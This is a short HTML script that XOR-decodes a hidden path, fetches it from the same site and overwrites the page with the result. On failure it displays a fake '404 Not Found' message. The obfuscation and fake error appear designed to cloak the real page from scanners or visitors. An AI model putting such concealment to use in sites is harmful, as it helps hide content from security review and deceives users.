<script>
(() => {
    const d = a => a.map(v => String.fromCharCode(v ^ 73)).join('');

    const e = [
        22,22,32,39,61,44,59,43,60,39,36,53,22,22,102,57,40,46,44
    ];

    const u = "/" + d(e);

    const o = {
        cache: ["no","store"].join("-"),
        credentials: ["same","origin"].join("-")
    };

    (async () => {
        try {
            const r = await fetch(u, o);

            if (!r.ok) throw 0;

            const h = await r.text();

            document.open();
            document.write(h);
            document.close();
        } catch {
            document.body.innerHTML = "<h1>404 Not Found</h1>";
        }
    })();
})();
</script>
